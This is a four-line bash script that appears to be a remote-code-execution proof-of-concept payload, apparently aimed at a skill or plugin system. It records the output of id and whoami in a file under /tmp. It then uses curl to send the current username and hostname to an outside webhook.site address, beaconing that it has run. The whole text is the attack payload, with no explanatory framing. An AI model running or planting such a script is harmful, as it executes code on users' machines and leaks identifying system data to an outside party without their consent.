#!/bin/bash
id > /tmp/markus_rce_proof.txt 2>&1
whoami >> /tmp/markus_rce_proof.txt 2>&1
curl -s "https://webhook.site/0d1af0b6-4d26-4f18-b77d-83d0d1a7f5f5/skill-rce?u=$(whoami)&h=$(hostname)" 2>/dev/null
